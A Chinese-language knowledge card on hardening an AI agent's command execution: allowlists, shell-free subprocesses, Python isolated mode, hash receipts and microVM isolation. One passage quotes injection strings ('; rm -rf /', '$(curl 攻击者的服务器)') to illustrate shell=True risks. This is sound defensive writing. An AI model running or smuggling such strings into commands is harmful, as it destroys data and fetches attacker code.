# 0027 进程级白名单对照microVM —— 知识卡片

### 进程级命令白名单(process-level command allowlist)

是什么:进程级白名单指模型给出的命令字符串只被"解析"、从不被执行的一道宿主侧检查(宿主指发起执行的宿主程序)。可执行程序名与脚本名必须都在枚举清单里,通过后由宿主代码拼出真正执行的 argv(实际传给操作系统的参数数组)。最紧的形态连参数个数都限死——只接受 `python <批准的脚本名>` 两个词,脚本名必须登记在清单内,不在清单里的名字一律拒绝。OWASP(开放全球应用安全项目)命令注入防御速查表把它归为 allowlist(白名单式输入校验),排序靠后:首选根本不执行 OS 命令(改用库函数),白名单是"必须执行时"最紧一道。

解决什么问题:模型生成的命令字符串不可信,可能夹带任意参数或额外命令;把"能跑什么"收进枚举清单,等于把开放的命令行缩成几个固定档位——攻击者即便完全劫持了模型,也只能在宿主预先批准的几个动作里挑。

我们的办法:一个教学参考项目(异步 Agent 运行时)的做法是判定与执行分离:判定函数用 `shlex.split` 解析命令字符串、核对清单,执行处用宿主拼装的 argv 发起子进程。注意 `shlex.split` 只复制 Unix shell 分词规则——变量替换 / 通配符 / 管道一概不展开、不报错,这是 shell 语义与分词器的差别——官方文档明确警告的只有一句:该模块仅为 Unix shell 设计,解析 ≠ 执行,分词不等于安全解释。

### 不经 shell 的子进程(shell=False direct exec)

是什么:指创建子进程时跳过 shell 解释器(负责解释命令语法的程序,如 /bin/sh)、把参数数组直接交给操作系统执行的做法,即 `shell=False`。分号、管道符、反引号、`$()`、通配符这些只在 shell 语法里有意义的字符,此时全部退化成普通文本参数——shell 注入面因此不是"被过滤掉",而是物理上不存在。Python 官方文档的安全注意事项(Security Considerations)是这句话的背书:该库"不会隐式选择调用系统 shell",包括元字符在内的所有字符都能安全传给子进程。

解决什么问题:对照形态是 `shell=True`:整条命令字符串交给解释器,管道、命令替换等语法会被真的展开,模型字符串里藏一段 `; rm -rf /` 或 `$(curl 攻击者的服务器)` 就能附加执行任意命令。诚实边界:Windows 上 `.bat`/`.cmd` 批处理文件无论参数如何都可能被操作系统经系统 shell 启动(Python 官方文档明说),所以"命令解释层彻底删掉"只在 macOS / Linux 上成立。

我们的办法:参考实现用 `asyncio.create_subprocess_exec(*argv, ...)`(argv 即传给操作系统的参数数组,exec 形态、跳过 shell)执行宿主拼装好的参数数组,并把子进程的 stdin 接到 DEVNULL(即特殊文件 `os.devnull`——读不到任何输入)。在 macOS / Linux 上,"命令解释"这一整层就此从攻击面里删掉。

### Python 隔离启动开关(python -I isolated mode)

是什么:Python 的隔离模式(isolated mode,即 `python -I` 启动开关)指解释器启动时切断"来自环境的配置注入"的运行方式。官方把 `-I` 分解成三个开关:`-E` 忽略 `PYTHONPATH` 等全部 `PYTHON*` 环境变量;`-s` 不加载用户 site-packages(用户级第三方包目录);`-P`(Python 3.11+ 才有)把脚本所在目录从模块搜索路径 sys.path 里排除。

解决什么问题:白名单与跳过 shell 两道检查过关后,还剩解释器自己的配置面可做手脚。攻击者只要能在环境里塞一个 `PYTHONPATH`,或往脚本同目录放一个与标准库同名的模块文件,被批准的脚本一 import 就会加载到恶意代码——`-P` 连同目录这条暗道也堵上。隔离开关把这层"连解释器都会被骗"的口子掐掉。

我们的办法:参考实现执行被批准脚本时固定加 `-I`(另配 `-u` 关闭输出缓冲)——白名单管"跑什么",隔离开关管"解释器信谁的配置",两层拼成一组;还可在程序里读 `sys.flags.isolated` 自检是否真在隔离模式。

### 执行完整性回执(execution integrity receipt)

是什么:执行完整性回执 [自造](自创叫法,一种防御侧审计实践)指每次执行都用 SHA-256(SHA-2 家族的密码学哈希函数,把任意内容压成固定长度的单向指纹;美国联邦标准 FIPS 180-4 规定的算法之一)把"到底跑了什么"记档的做法。被批准脚本、输入文件、argv(传给操作系统的参数数组)三样的哈希全部写进一条回执记录;复盘时重算哈希一比,即可证明"审计里写的命令"与"实际执行的字节"一致。

解决什么问题:审计日志记的是文本参数,理论上可能与真实执行有出入、也可能被篡改;哈希回执给复盘一个可验证的锚点——对不上,就说明记录与执行之间被动过手脚。思路与 MITRE ATT&CK(公开的攻击手法知识库)里 Audit 这条缓解措施的官方表述同向:完整性校验应与"已知有效状态"的哈希比对——这里把"已知有效状态"换成执行瞬间的 argv 与输入字节。

我们的办法:参考实现把三样哈希记进回执;对自家的启示是给任意命令的审计观测补记一条命令串的 SHA-256——虚拟机一次性场景下意义减弱(里面的代码本就不受信),但成本低、复盘价值高,已记入后续加固待办。

### 能跑什么与能去哪(what runs vs where it can reach)

是什么:这是一套把隔离思路二分的提法 [自造](自创框架):进程级白名单管「能跑什么」——把可执行动作收进枚举清单(即 OWASP 命令注入防御里的 allowlist,白名单);虚拟机级隔离管「跑的地方能碰到什么」——出网域名白名单加上一次性 microVM(带独立内核的微型虚拟机,用完即焚)。两道检查管的对象不同,是正交的(互不重叠、各管一面)两层、不是竞争方案——OWASP 的命令注入防御清单没把虚拟机隔离列进防御层,可作两层正交的旁证。

解决什么问题:选边界前要看清三处差异。执行位置:进程级是与宿主同内核、同 UID(用户身份)的普通子进程,打穿后文件与网络按宿主用户全暴露;虚拟机级是独立内核的一次性机器,里面 root 满血、宿主零可见。信任根:进程级押注"被批准的代码不作恶";虚拟机级押注 hypervisor(虚拟机监督程序,硬件虚拟化边界)——开源实现 Firecracker 即一个基于 Linux KVM(内核虚拟机模块)的 VMM(即 hypervisor 的实现程序),官方卖点正是"硬件虚拟化提供的隔离性"。深度:进程级的一切约束(白名单、跳过 shell)都作用在解释层,解释层被打穿后没有任何内核边界兜底。

我们的办法:判据是任务面可枚举性——命令形态固定 / 代码全是自己写 / 数据不敏感,进程级白名单几行代码就够,要跑任意命令 / 跑不可信代码 / 碰敏感数据,就必须虚拟机级。次序:先审威胁模型(假设谁已得手 / 能碰什么)再选边界强度,与 NIST SP 800-207 的迁移方法论同构——先盘点主体与资产、再定信任策略(其第 2.1 节先申明全篇前提假设)。
